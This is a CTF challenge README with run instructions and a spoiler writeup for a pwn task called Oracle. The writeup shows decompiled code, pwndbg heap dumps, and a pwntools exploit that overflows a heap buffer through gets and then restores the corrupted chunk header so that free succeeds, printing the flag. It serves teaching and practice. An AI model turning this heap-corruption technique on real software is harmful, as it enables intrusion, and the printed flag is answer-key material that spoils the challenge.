# Oracle

A <ins>medium difficulty pwn</ins> challenge where a port and the a [zip file](out/challenge.zip) is given to the players.

## How to run

The image was tested with podman, but should work fine with docker as well.

0. Clone the repo and cd to the root folder of the particular challenge
1. Build the image: `podman build -t ctf-oracle:latest .`
2. Run the image: `podman rm -f ctf-oracle; podman run --rm -it -p 1337:1337 -e CHALLENGE_PORT=1337 --name ctf-oracle ctf-oracle:latest`
3. Share the [zip file](out/challenge.zip) and the port with the players

<details>
<summary>Writeup (Spoiler)</summary>

This challenge is essentially the brother of delphi. However in this case, if we load the binary up in Ghidra, we can see that the `main` function is a bit different:

```c

undefined8 FUN_0040146b(void)

{
  int iVar1;
  char *__s;
  char *__s2;
  long in_FS_OFFSET;
  int local_60;
  int local_5c;
  char local_48 [56];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  FUN_00401314();
  FUN_00401286();
  __s = (char *)malloc(0x10);
  __s2 = (char *)malloc(0x20);
  memset(__s2,0,0x20);
  getrandom(__s2,0x20,0);
  for (local_5c = 0; local_5c < 0x20; local_5c = local_5c + 1) {
    if ((__s2[local_5c] == '\0') || (__s2[local_5c] == '\n')) {
      __s2[local_5c] = '*';
    }
  }
  do {
    if (local_60 == 1) {
      puts("You are a true mind reader.");
      FUN_004013b2();
LAB_0040165d:
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return 0;
    }
    puts("Welcome to the Oracle of Delphi!");
    puts("Hic es forsit ut tuum futurum invenias.\n");
    puts(
        "I will think of something bright and shiny. If you manage to think of the same thing, I wil l predict your future."
        );
    puts("If not, shall the gods have mercy on your soul.\n");
    printf("What shall I think of (ie What\'s my favorite instrument)? ");
    FUN_00401334(__s);
    printf("So you asked: ");
    puts(__s);
    puts("Okay, now that\'s a good one. Let me think...");
    sleep(2);
    printf("Got it. Any clue what it is I had in mind? ");
    fgets(local_48,0x21,stdin);
    iVar1 = strncmp(local_48,__s2,0x20);
    if (iVar1 != 0) {
      puts("Nope, that\'s not it. You\'re doomed.");
      goto LAB_0040165d;
    }
    puts("Just double checking... What did you say? ");
    gets(__s);
    puts("Woah... You got it. Interested in a job offer? We have some good java coffee.");
    free(__s2);
    free(__s);
    local_60 = 1;
  } while( true );
}
```

There is an extra while loop and some extra `free` calls happen on the two buffers. We can use the same exploit to get to the `You got it` message, however if we do the stack overflow, the heap will be corrupted and the `free` calls will fail. Therefore we won't get our flag.

Which means that we need to fix the heap corruption. There is a `gets` call at the double checking which we can use to do that. However we don't know what the heap looks like, so let's set a breakpoint before the stack overflow for example to the `What shall I think of` line and another one to `"Woah... You got it.` where the heap is already corrupted:

```py
gdbscript = """
break *0x40157f
break *0x401634
continue
""".format(
    **locals()
)
```

Time to run this with GDB and see what's going on. I will use pwndbg.

If I run `heap` at the first breakpoint I see this:

```
pwndbg> heap
pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.

Allocated chunk | PREV_INUSE
Addr: 0xc29000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0xc29290
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0xc292b0
Size: 0x30 (with flag bits: 0x31)

Top chunk | PREV_INUSE
Addr: 0xc292e0
Size: 0x20d20 (with flag bits: 0x20d21)
```

While vis reveals the following layout:

```
pwndbg> vis

0xc29000        0x0000000000000000      0x0000000000000291      ................
0xc29010        0x0000000000000000      0x0000000000000000      ................
0xc29020        0x0000000000000000      0x0000000000000000      ................
0xc29030        0x0000000000000000      0x0000000000000000      ................
0xc29040        0x0000000000000000      0x0000000000000000      ................
0xc29050        0x0000000000000000      0x0000000000000000      ................
0xc29060        0x0000000000000000      0x0000000000000000      ................
0xc29070        0x0000000000000000      0x0000000000000000      ................
0xc29080        0x0000000000000000      0x0000000000000000      ................
0xc29090        0x0000000000000000      0x0000000000000000      ................
0xc290a0        0x0000000000000000      0x0000000000000000      ................
0xc290b0        0x0000000000000000      0x0000000000000000      ................
0xc290c0        0x0000000000000000      0x0000000000000000      ................
0xc290d0        0x0000000000000000      0x0000000000000000      ................
0xc290e0        0x0000000000000000      0x0000000000000000      ................
0xc290f0        0x0000000000000000      0x0000000000000000      ................
0xc29100        0x0000000000000000      0x0000000000000000      ................
0xc29110        0x0000000000000000      0x0000000000000000      ................
0xc29120        0x0000000000000000      0x0000000000000000      ................
0xc29130        0x0000000000000000      0x0000000000000000      ................
0xc29140        0x0000000000000000      0x0000000000000000      ................
0xc29150        0x0000000000000000      0x0000000000000000      ................
0xc29160        0x0000000000000000      0x0000000000000000      ................
0xc29170        0x0000000000000000      0x0000000000000000      ................
0xc29180        0x0000000000000000      0x0000000000000000      ................
0xc29190        0x0000000000000000      0x0000000000000000      ................
0xc291a0        0x0000000000000000      0x0000000000000000      ................
0xc291b0        0x0000000000000000      0x0000000000000000      ................
0xc291c0        0x0000000000000000      0x0000000000000000      ................
0xc291d0        0x0000000000000000      0x0000000000000000      ................
0xc291e0        0x0000000000000000      0x0000000000000000      ................
0xc291f0        0x0000000000000000      0x0000000000000000      ................
0xc29200        0x0000000000000000      0x0000000000000000      ................
0xc29210        0x0000000000000000      0x0000000000000000      ................
0xc29220        0x0000000000000000      0x0000000000000000      ................
0xc29230        0x0000000000000000      0x0000000000000000      ................
0xc29240        0x0000000000000000      0x0000000000000000      ................
0xc29250        0x0000000000000000      0x0000000000000000      ................
0xc29260        0x0000000000000000      0x0000000000000000      ................
0xc29270        0x0000000000000000      0x0000000000000000      ................
0xc29280        0x0000000000000000      0x0000000000000000      ................
0xc29290        0x0000000000000000      0x0000000000000021      ........!.......
0xc292a0        0x0000000000000000      0x0000000000000000      ................
0xc292b0        0x0000000000000000      0x0000000000000031      ........1.......
0xc292c0        0x7e318b1c47734670      0x060d1089edf210cb      pFsG..1~........
0xc292d0        0x6c1385d76ce89030      0xa482685b94680ead      0..l...l..h.[h..
0xc292e0        0x0000000000000000      0x0000000000020d21      ........!.......         <-- Top chunk
```

It's little endian so we see our relevant data at the bottom including our random buffer's content and the yet empty user input buffer. Let's run `c` to continue.

```
pwndbg> heap
pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.

Allocated chunk | PREV_INUSE
Addr: 0x14fa000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x14fa290
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x14fa2b0
Size: 0xa61616861616160 (with flag bits: 0xa61616861616167)
```

Running heap again and it seems corrupted. In fact the size is now our cyclic pattern. Let's see what vis says:

```
pwndbg> set max-visualize-chunk-size 100
Set max display size for heap chunks visualization (0 for display all) to 100.
pwndbg> vis

0x14fa000       0x0000000000000000      0x0000000000000291      ................
0x14fa010       0x0000000000000000      0x0000000000000000      ................
0x14fa020       0x0000000000000000      0x0000000000000000      ................
0x14fa030       0x0000000000000000      0x0000000000000000      ................
.........
0x14fa250       0x0000000000000000      0x0000000000000000      ................
0x14fa260       0x0000000000000000      0x0000000000000000      ................
0x14fa270       0x0000000000000000      0x0000000000000000      ................
0x14fa280       0x0000000000000000      0x0000000000000000      ................
0x14fa290       0x0000000000000000      0x0000000000000021      ........!.......
0x14fa2a0       0x6161616261616100      0x6161616461616163      .aaabaaacaaadaaa
0x14fa2b0       0x6161616661616165      0x0a61616861616167      eaaafaaagaaahaa.
0x14fa2c0       0x77a108ae2b064020      0x5d7f01dec5e10f7d       @.+...w}......]
0x14fa2d0       0x73542b5d2faeec83      0xc7f1080990d1f85b      .../]+Ts[.......
0x14fa2e0       0x0000000000000000      0x0000000000020d21      ........!.......         <-- Top chunk
.........
0x151afc0       0x0000000000000000      0x0000000000000000      ................
0x151afd0       0x0000000000000000      0x0000000000000000      ................
0x151afe0       0x0000000000000000      0x0000000000000000      ................
0x151aff0       0x0000000000000000      0x0000000000000000      ................
```

Our goal is simple. Using the gets we have, we can restore the heap to match its original layout. So we see that we need to send 24 bytes of \x00 to null the content, then one time \x31 for the size and finally 7 times \x00 to have it completely restored.

Let's put the exploit together:

```py
exe = "./oracle_patched"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"

io = start()

io.sendlineafter(b"instrument)?", cyclic(31))
line = io.recvline()
log.info(f"Line: {line}")

thought = io.recvline()[0:32]
log.info(f"Thought: {thought}")

io.sendafter(b"mind? ", thought)
io.sendlineafter(b"say? ", (b"\x00" * 24) + b"\x31" + (b"\x00" * 7))

io.recvline_endswith(b"reader.")
flag = io.recvline().decode().strip()
log.info(f"Flag: {flag}")
```

Time to run it:

```
[DEBUG] Received 0x2a bytes:
    b'Just double checking... What did you say? '
[DEBUG] Sent 0x21 bytes:
    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000010  00 00 00 00  00 00 00 00  31 00 00 00  00 00 00 00  │····│····│1···│····│
    00000020  0a                                                  │·│
    00000021
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x9b bytes:
    b'Woah... You got it. Interested in a job offer? We have some good java coffee.\n'
    b'You are a true mind reader.\n'
    b'cq23{sUch_@_typ1c4l_r341_w0rld_siTUaT10n_righT?}\n'
[*] Flag: cq23{sUch_@_typ1c4l_r341_w0rld_siTUaT10n_righT?}
```

And there we have it. :)

Note: The included `poc.py` only works locally if you execute it from the `out` folder.
</details>